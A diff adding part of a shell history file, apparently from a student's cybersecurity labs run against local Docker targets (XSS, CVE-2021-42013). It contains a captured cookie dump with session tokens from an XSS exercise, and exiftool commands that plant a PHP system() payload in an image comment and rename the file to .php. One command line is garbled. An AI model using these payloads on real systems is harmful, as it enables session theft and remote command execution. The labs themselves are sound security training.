@@ -1,0 +1,83 @@
+ 4410  cd Lab8
+ 4411  sudo docker run -it -p 9901:9901 mazurkatarzyna/xss-example-server-1.
+ 4412  sudo docker run -it -p 9901:9901 mazurkatarzyna/xss-example-server-1
+ 4413  cd ..
+ 4414  ls
+ 4415  cd ..
+ 4416  cd Cybersecurity
+ 4417  ls
+ 4418  cd Lab8
+ 4419  sudo docker run -dp 9095:5230 mazurkatarzyna/cwe-79-ex5:latest
+ 4420  code notatki.txt
+ 4421  ls
+ 4422  code image1.svg
+ 4423  mv image1.svg image2.svg
+ 4424  code .
+ 4425  ls
+ 4426  cp image2.svg image3.svg
+ 4427  code image3.svg
+ 4428  ls
+ 4429  cat server.py
+ 4430  python3 server.py 9999
+ 4431  echo -n "INFO:root:POST request,\nPath: /\nHeaders:\nHost: 127.0.0.1:9999\nConnection: keep-alive\nContent-Length: 0\nsec-ch-ua-platform: "Linux"\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\nsec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"\nDNT: 1\nsec-ch-ua-mobile: ?0\nAccept: */*\nOrigin: http://127.0.0.1:9095\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:9095/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: access-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoicm9vdCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMSIsImF1ZCI6WyJ1c2VyLmFjY2Vzcy10b2tlbiJdLCJleHAiOjE3MzI3ODg5OTAsImlhdCI6MTczMjcwMjU5MH0.nox-xu58FB_DHT_y-NiPuzQ7UFNyrBCDVU6dTn3tRvk; refresh-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoicm9vdCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMSIsImF1ZCI6WyJ1c2VyLnJlZnJlc2gtdG9rZW4iXSwiZXhwIjoxNzMzMzA3MzkwLCJpYXQiOjE3MzI3MDI1OTB9.2tnFCO8S11wecaNq7hDI7pVz2xaYT2dDydFeWkzPf_8; memos_session=MTczMzEzODE2MHxEdi1CQkFFQ180SUFBUkFCRUFBQUh2LUNBQUVHYzNSeWFXNW5EQWtBQjNWelpYSXRhV1FEYVc1MEJBSUFCQT09fHqD2--KrTtI1Rog8sZvbL_jwKZaGFjRNEuJ6lTUxS59\n" > server_output.txt
+ 4432  ls
+ 4433  echo -n "INFO:root:POST request,\nPath: /\nHeaders:\nHost: 127.0.0.1:9999\nConnection: keep-alive\nContent-Length: 0\nsec-ch-ua-platform: "Linux"\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\nsec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"\nDNT: 1\nsec-ch-ua-mobile: ?0\nAccept: */*\nOrigin: http://127.0.0.1:9095\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:9095/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: access-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoicm9vdCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMSIsImF1ZCI6WyJ1c2VyLmFjY2Vzcy10b2tlbiJdLCJleHAiOjE3MzI3ODg5OTAsImlhdCI6MTczMjcwMjU5MH0.nox-xu58FB_DHT_y-NiPuzQ7UFNyrBCDVU6dTn3tRvk; refresh-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoicm9vdCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMSIsImF1ZCI6WyJ1c2VyLnJlZnJlc2gtdG9rZW4iXSwiZXhwIjoxNzMzMzA3MzkwLCJpYXQiOjE3MzI3MDI1OTB9.2tnFCO8S11wecaNq7hDI7pVz2xaYT2dDydFeWkzPf_8; memos_session=MTczMzEzODE2MHxEdi1CQkFFQ180SUFBUkFCRUFBQUh2LUNBQUVHYzNSeWFXNW5EQWtBQjNWelpYSXRhV1FEYVc1MEJBSUFCQT09fHqD2--KrTtI1Rog8sZvbL_jwKZaGFjRNEuJ6lTUxS59\n" > server_output.txt
+ 4434  ls
+ 4435  echo -n "INFO:root:POST request,\nPath: /\nHeaders:\nHost: 127.0.0.1:9999\nConnection: keep-alive\nContent-Length: 0\nsec-ch-ua-platform: "Linux"\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\nsec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"\nDNT: 1\nsec-ch-ua-mobile: ?0\nAccept: */*\nOrigin: http://127.0.0.1:9095\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:9095/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: access-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoicm9vdCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMSIsImF1ZCI6WyJ1c2VyLmFjY2Vzcy10b2tlbiJdLCJleHAiOjE3MzI3ODg5OTAsImlhdCI6MTczMjcwMjU5MH0.nox-xu58FB_DHT_y-NiPuzQ7UFNyrBCDVU6dTn3tRvk; refresh-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoicm9vdCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMSIsImF1ZCI6WyJ1c2VyLnJlZnJlc2gtdG9rZW4iXSwiZXhwIjoxNzMzMzA3MzkwLCJpYXQiOjE3MzI3MDI1OTB9.2tnFCO8S11wecaNq7hDI7pVz2xaYT2dDydFeWkzPf_8; memos_session=MTczMzEzODE2MHxEdi1CQkFFQ180SUFBUkFCRUFBQUh2LUNBQUVHYzNSeWFXNW5EQWtBQjNWelpYSXRhV1FEYVc1MEJBSUFCQT09fHqD2--KrTtI1Rog8sZvbL_jwKZaGFjRNEuJ6lTUxS59\n" > server_output.txt
+ 4436  code server_output.txt
+ 4637  mkdir Lab9
+ 4638  cd Lab9
+ 4639  ls
+ 4640  docker run -dp 10001:80 mazurkatarzyna/cik-book-p1-ch10-ex1\n
+ 4641  sudo docker run -dp 10001:80 mazurkatarzyna/cik-book-p1-ch10-ex1\n
+ 4642  code notatki.txt
+ 4643  code ex1.php
+ 4644  cp ex1.php ex1v2.php
+ 4645  code ex1v2.php
+ 4646  ls
+ 4647  cd Cybersecurity/Lab9
+ 4648  ls
+ 4649  sudo docker run -dp 10002:80 mazurkatarzyna/cik-book-p1-ch10-ex2
+ 4650  gzip -dc Image-ExifTool-13.06.tar.gz | tar -xf -
+ 4651  ls
+ 4652  ./Image-ExifTool-13.06
+ 4653  ls
+ 4654  perl
+ 4655  perl Makefile.PL
+ 4656  make test
+ 4657  sudo make install
+ 4658  ls
+ 4659  cd ..
+ 4660  ls
+ 4661  exiftool
+ 4662  exiftool tux.png_original
+ 4663  exiftool -comment=<?php system('ls -la'); ?>" tux.png_original\nsss\nss\n\nss\ns\ns\ns\ns\nss\ns\ns\ns\ns\ns\n\n
+ 4664  ls
+ 4665  exiftool tux.png_original
+ 4666  exiftool -Comment tux.png_original
+ 4667  exiftool -Comment="<?php system('ls -la'); ?>" tux.png_original
+ 4668  exiftool -Comment tux.png_original
+ 4669  mv tux.png_original tux.png_original.php
+ 4670  exiftool -Comment tux.png_original.php
+ 4759  mkdir Lab10
+ 4760  cd Lab10
+ 4761  ls
+ 4762  docker compose -f docker-compose-cve-2023-4195.yml up
+ 4763  sudo docker compose -f docker-compose-cve-2023-4195.yml up
+ 4764  docker ps
+ 4765  sudo docker ps
+ 4766  code notatki.txt
+ 4767  docker run -dp 42013:80 mazurkatarzyna/cve-2021-42013\n
+ 4768  sudo docker run -dp 42013:80 mazurkatarzyna/cve-2021-42013\n
+ 4769  ls
+ 4770  docker compose docker-compose-cve-2022-1103.yml up
+ 4771  sudo docker compose -f docker-compose-cve-2022-1103.yml up
+ 4772  ls
+ 4773  rm dokument_18619247f742be41500bff98c87e82d7.pdf
+ 4774  cd ..
+ 5102  mkdir Lab11
+ 5103  cd Lab11
+ 5104  code notes.txt
+ 5105  docker pull mazurkatarzyna/bsk-book-p1-ch5
+ 5106  sudo docker pull mazurkatarzyna/bsk-book-p1-ch5
+ 5107  cd ..
